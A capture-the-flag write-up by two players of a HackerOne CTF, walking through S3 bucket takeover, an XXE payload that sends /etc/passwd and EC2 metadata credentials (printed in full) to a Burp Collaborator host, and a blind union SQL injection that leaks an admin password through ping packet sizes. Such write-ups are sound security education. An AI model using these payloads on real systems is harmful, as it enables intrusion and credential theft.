---
title: "CCC h1-ctf Write-up"
date: 2021-06-19T12:24:35+05:30
draft: false
---

This write-up is co-written by me [@Dexter0us](https://twitter.com/0xDexter0us) and [@mass0ma](https://twitter.com/mass0ma). We were one of the winners of the CTF and won a $100 reward from [hacker101](https://hacker101.com). The CTF was quiet challenging and fun to play. Hope you can enjoy and gain something from this write-up. You can folow us of Twitter [@Dexter0us](https://twitter.com/0xDexter0us), [@mass0ma](https://twitter.com/mass0ma) and can hang out with us on Discord [Hack The Planet](https://discord.gg/pRZDxmxp) [Bounty Hunters](https://discord.gg/bugbounty) if you like :).

---

We started the CTF with the basic endpoint enumeration we found two endpoints `.config` and `zipfiles` which were looking interesting but both of them turned out to be rabbit hole nothing was in there, we also started looking at Javascript files nothing interesting even there. Then we started to play with the application registered for an account. And then a hint poped up in twitter.

{{< image src="/images/ccc-h1ctf/image-20210603221644140.png" position="center" style="border-radius: 5px;" >}}



An endpoint disclosure but we had to guess the extension which wasn't hard it was just a `.txt`, in that `error_-_-_log.txt` we found our first interesting clue.

{{< image src="/images/ccc-h1ctf/image-20210603221849214.png" position="center" style="border-radius: 5px;" >}}


Five AWS S3 bucket urls. Since the CTF was based on todayisnew’s best vulnerabilities. We all know two best bug class of todayisnew is Subdomain Takeover and Information Disclosure. Right away we jumped and started to test the permissions of these S3 buckets, out of five buckets only two of them gave interesting result, first one `h1-6hin8w` gave `NXDOMAIN` and from the second bucket `h1-cn9uhd` we were able to fetch the `files.xml` file.

{{< image src="/images/ccc-h1ctf/image-20210603223741876.png" position="center" style="border-radius: 5px;" >}}

---

{{< image src="/images/ccc-h1ctf/image-20210603223732544.png" position="center" style="border-radius: 5px;" >}}


Since the CTF is based around todayisnew's methodology first thing I did was to takeover that S3 bucket and uploaded a PoC at `https://h1-6hin8w.s3.eu-west-2.amazonaws.com/poc.dexter0us.txt` then I had an evil idea. 

{{< image src="https://media1.tenor.com/images/c7226c3298a1885eacac632bf3d6cf74/tenor.gif?itemid=12538746" position="center" style="border-radius: 5px;" >}}


why not make a files.xml file and upload it to bucket and have some fun with other CTF players, so we played an innocent prank on other CTF players. We encoded Rick Astley's song in base64 and uploaded it.

{{< image src="/images/ccc-h1ctf/image-20210603222925432.png" position="center" style="border-radius: 5px;" >}}


Now from the downloaded xml file we discovered a new domain `patopirata.com` after digging a bit and some directory bruteforcing on that new domain we discovered a new file `http://patopirata.com/info.php` while later turned out to be another rabbit hole. But the xml file in itself was a big hint  **XXE**

{{< image src="/images/ccc-h1ctf/image-20210603224127421.png" position="center" style="border-radius: 5px;" >}}
---

{{< image src="/images/ccc-h1ctf/image-20210603224304860.png" position="center" style="border-radius: 5px;" >}}

After falling into two rabbit holes we started to test the main application, we discovered that when you create a login on the site you get a unique hash e.g. `https://ccc.h1ctf.com/u/2h8x50` from that `error_-_-_log.txt` file we guessed that we must have to create an S3 bucket with our unique hash to store our own `files.xml` file to trigger out XXE payload. With a bit of trial and error we came up with this XXE LFI payload:

```xml-dtd
<!ENTITY % filepd SYSTEM "https://o3s52u8tar80ojlzicatifurxi39ry.burpcollaborator.net">
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://o3s52u8tar80ojlzicatifurxi39ry.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```
----
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://h1-2h8x50.s3.eu-west-2.amazonaws.com/evil.dtd"> %xxe;]>
<list></list>
```

We saved the above files as `evil.dtd` and `files.xml` respectively in our S3 bucket with public read access.
After that we reloaded our page and we got hit on our burp collaborator and guess what it contained base64 encoded `etc/passwd` file.

{{< image src="/images/ccc-h1ctf/image-20210603230030784.png" position="center" style="border-radius: 5px;" >}}

---

{{< image src="/images/ccc-h1ctf/image-20210603230059676.png" position="center" style="border-radius: 5px;" >}}

At this point it seemed pretty easy to us but oh boy we got trapped into rabbit holes again twice, so as an usual approach, we went after AWS metadata we modified our `evil.dtd` file and fetched the ec2 security credentials.

```xml-dtd
<!ENTITY % filepd SYSTEM "https://o3s52u8tar80ojlzicatifurxi39ry.burpcollaborator.net">
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://o3s52u8tar80ojlzicatifurxi39ry.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

{{< image src="/images/ccc-h1ctf/image-20210603230945841.png" position="center" style="border-radius: 5px;" >}}

```json

{
  "Code" : "Success",
  "LastUpdated" : "2021-06-02T18:53:08Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6C6OFKLEVQOO7RUP",
  "SecretAccessKey" : "1gGE/U+5jycrIuPZF4CfB+eSsyxtwwEl1KCaCszf",
  "Token" : "IQoJb3JpZ2luX2VjEDMaCXVzLWVhc3QtMiJIMEYCIQCDl7TeQZmzN5R/l7hdi6Mlfd+TcStBZxyoWWKrvDMskQIhANRqcy3roBjS9QendkogX+d5ku/vU8MbS3bBLcPhu2t/KsgDCNz//////////wEQAhoMOTY4NDEwNjE2NTIxIgxor8kXerwAN/met6MqnAOnLyHAYmGZScCGcMxCuKYv/fu2TPyoxpHViBBt/UVS/bwZH0Dv1kUBFY8LJzeoPz/QXWwRG9krZ0WvqELAL9CjJDkTN4ajRYKhDY97rtcbW8O3AX5oHkkIj+UTY2x4VQPufuKVdaCmdGFfNoTYAJ2nDSvzHpFtuIzHzlGwh4eG8gX6jDG4xCGbLDC8xcSl7xoXpk3Y4jrze68bJ1KdQlLsRIdrnmEDr95PGyHF9uXtVGZxVVN1fBLkXhUahAHODkHVP9WA9Rm8XqNnVTzCg7opKofpEQGfb+H+iKZARONrYJFPCZhPhnq0RoCEWslqH5FyQwmJXcnAneWRxwB2Igt8HxMAErrrMYl9fVayke1GndIMNAQcQJQdO9B1WsMnMEPOstLGkOdMwlDDASTeF2HMFkZda3Wwyix7Jfiga093Bj5FXPOzO/J2qk5vymzQ/46VaWkrSFIB0ZHQf8sSlDKW52IK6CAp0PK+0DqjKg49EaXsLJD9voVuZkJCRYtv7p9FaumVh7VZH5y4WaJzZufazgprzBHVhgQFnc57MNum34UGOuYB5iV36a4M0hIqXkrNpKcoukadtes29Cj/YlRutvZbGZSry7Yt0gKL+JC3ud4gsTDXDvQCW43xzIZMD9HT5GcXhCPazWjTC16THt9eIWKIANNneu8+T50O2oMZ90dNShOI7DvNaBGUE8HNc2CFLf/Vhtt66IsQ8Za/++qqpkijOhT7WsKFr7bjYCwj2LmtueXrNo49ZOBttmDGTQPSbzkPHx5wfojX3Xqsh3m/GADHbCqgfAJ1JsZVYBEi/pzIFIQpqjv3m7PaZu03E6DYMYur0C9Ww5kbcmE5H2O09awC7tS3bRIrydk=",
  "Expiration" : "2021-06-03T00:59:01Z"
}
```

We got so pumped and thought we are just a few steps away from RCE but after struggling for over four hours when we were clueless but it was sure we are not on the right path then we started to dig deeper and we fall into another rabbit hole we had fetched `index.php` file to analyse its code and we got a secret hash from it which looked pretty interesting

```php
$secret_hash='MUI0MjM3RjQ3NjgyNjk4NkRBNjMwMjJBNzZDMzVCQjE=';
```

So we started to reverse the hash, it was a base64 encoded md5 hash. After decoding the hash we got the value `dQw4w9WgXcQ` we started to think all over the place where can this hash be used, then after dropping the hash in google we realised.

{{< image src="/images/ccc-h1ctf/image-20210603233705690.png" position="center" style="border-radius: 5px;" >}}
---

{{< image src="/images/ccc-h1ctf/image-20210603233909342.png" position="center" style="border-radius: 5px;" >}}

*We got Rick Rolled* and we are big believers of *KARMA* then this happened.

{{< image src="/images/ccc-h1ctf/image-20210603234954621.png" position="center" style="border-radius: 5px;" >}}

We Rick Rolled the creater of the CTF Adam Langley himself then there was a second hint which dropped earlier.

{{< image src="/images/ccc-h1ctf/image-20210603231333989.png" position="center" style="border-radius: 5px;" >}}

So we changed our approach and grabbed the nginx files as an obvious choice from the hint we downloaded `/etc/nginx/nginx.conf` and `/etc/nginx/sites-enabled/default`

----
{{< code language="nginx" title="nginx.conf" id="1" expand="Expand" collapse="Hide" isCollapsed="true" >}}
pre {
  user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log off;
	error_log off;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}


#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
# 
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
# 
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
# 
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}

}
{{< /code >}}

{{< code language="nginx" title="default" id="2" expand="Expand" collapse="Hide" isCollapsed="true" >}}
pre {
  ##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
#server {
#        listen 80 default_server;
#        listen [::]:80 default_server;
#
#        root /var/www/html;
#
#        # Add index.php to the list if you are using PHP
#        index index.html index.htm index.nginx-debian.html;
#
#        server_name _;
#
#        location / {
#                try_files $uri $uri/ =404;
#        }       
#}

#server {
#    server_name ccc.h1ctf.com;
#    root /var/www/app/public;
#    index index.php;
#    location / {
#            try_files $uri $uri/ /index.php?$query_string;
#    }
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
#
#    location ~ \.php$ {
#            include snippets/fastcgi-php.conf;
#            fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
#    }
#    listen 443 ssl;
#    ssl_certificate /etc/letsencrypt/live/ccc.h1ctf.com/fullchain.pem;
#    ssl_certificate_key /etc/letsencrypt/live/ccc.h1ctf.com/privkey.pem;
#    include /etc/letsencrypt/options-ssl-nginx.conf;
#    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
#}

#server {
#    if ($host = ccc.h1ctf.com) {
#        return 301 https://$host$request_uri;
#    }
#    listen 80;
#    server_name ccc.h1ctf.com;
#    return 404;
#}
}
{{< /code >}}

---
in the `etc/nginx/sites-enabled/default` file under the location we found a new application running under `/2b5d2b11513d2c9b` Pinger Network Monitor Tool.

{{< image src="/images/ccc-h1ctf/image-20210603232547150.png" position="center" style="border-radius: 5px;" >}}

Here we started doing our basic directory bruteforcing and soon after we found `.git` endpoint, the best thing a pentester can ask for. We downloaded the `.git/config` file and found a open github repository.

{{< image src="/images/ccc-h1ctf/image-20210603232750970.png" position="center" style="border-radius: 5px;" >}}
---
{{< image src="/images/ccc-h1ctf/image-20210603233056662.png" position="center" style="border-radius: 5px;" >}}

After that we cloned the repository and started to do the source code analysis. We started to analyse how can we bypass the login or leak the password or access any of the endpoints unauthorised, after our initial analysis we found an interesting endpoint `/api/ping?id=` in short this endpoint collects an integer parameter `id` then in `controllers/Pinger.php` it fetches `id, ip, packet_size` from the database and executes a shell command pinging the `ip` in `models/ping.php` 

{{< image src="/images/ccc-h1ctf/image-20210604015246390.png" position="center" style="border-radius: 5px;" >}}
---
{{< image src="/images/ccc-h1ctf/image-20210604025003604.png" position="center" style="border-radius: 5px;" >}}
---
{{< image src="/images/ccc-h1ctf/image-20210604025015169.png" position="center" style="border-radius: 5px;" >}}
After further analysis we got a big confirmation that we are on right track, when we saw this unsanitised SQL query and we knew we have to deal with SQLi here.

{{< image src="/images/ccc-h1ctf/image-20210604015150785.png" position="center" style="border-radius: 5px;" >}}

so we first tried to figure out ways to make connection to our server but for some reasons none of them worked and we were facing a blind SQL injection so were not even greeted with any SQL error in case we messed up our payloads, after alot of googling and write-up reading we came to conclusion that we are facing a Union Based Blind SQL Injection so we have to use payloads in this format as the code in db.sql indicates 

```sql
-1 union select 1,127.0.0.1,32 -- 
```
Our full payload should look like this with url encoding:

```http
https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping/?id=-1%20UNION%20SELECT%204%2c'127.0.0.1'%2c32%20--%20
```

On our VPS we started to trace the ping with tcpdump and we got call back.
```bash
tcpdump ip proto \\icmp
```
---
{{< image src="/images/ccc-h1ctf/image-20210604020827867.png" position="center" style="border-radius: 5px;" >}}

After successfully getting callback we needed to figure out the password length of the admin account from the database, after lots of trial and error we got a hit on this payload: 

```sql
-1 UNION SELECT 4,'127.0.0.1',32 from user where id=1 and length(password)<22 limit 1--
```
---
```http
https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping/?id=-1%20UNION%20SELECT%204,'127.0.0.1',32%20from%20user%20where%20id=1%20and%20length(password)<22%20limit%201--
```
Then we got result length of password, which is 21 characters. So we now use the following payload to exfil the password via packet size character by character upto 21 characters :

```sql
-1 UNION SELECT 4,'127.0.0.1',ascii(substring(password,1,1)) from user where id=1 -- 
-1 UNION SELECT 4,'127.0.0.1',ascii(substring(password,2,1)) from user where id=1 -- 
-1 UNION SELECT 4,'127.0.0.1',ascii(substring(password,3,1)) from user where id=1 -- 
```
---
```http
https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping/?id=-1%20UNION%20SELECT%204,'127.0.0.1',ascii(substring(password,1,1))from%20user%20where%20id=1%20--
```

Biggest frustrating part of this CTF was the time limit on the `/api/ping` endpoint, one request per one minute. For hitting the endpoint 21 times we automated this process with burp intruder and we added delay of one minute between each request.

{{< image src="/images/ccc-h1ctf/image-20210604022539717.png" position="center" style="border-radius: 5px;" >}}
---
{{< image src="/images/ccc-h1ctf/2021-06-04_11-19.png" position="center" style="border-radius: 5px;" >}}

After 21 requests and 21 minutes of waiting we finally got all characters but in packet length we had to subtract the packet length from `8` to get the ASCII value of the character of our password then we ended up with : `Ud7##############dQgI` 

{{< image src="/images/ccc-h1ctf/image-20210604023822223.png" position="center" style="border-radius: 5px;" >}}

Using the password along with admin username we logged in to the Pinger Network Monitor Tool Login Panel and were greeted with this nice greeting saying we have successfully completed this CTF with our flag.

{{< image src="/images/ccc-h1ctf/2021-06-19_18-57.png" position="center" style="border-radius: 5px;" >}}


I would like to mention our mentor [@pmnh](https://twitter.com/h1pmnh) who helped us alot and our dear friend [Kabir Suda (MR-SINISTER)](https://twitter.com/KabirSuda) for playing along.


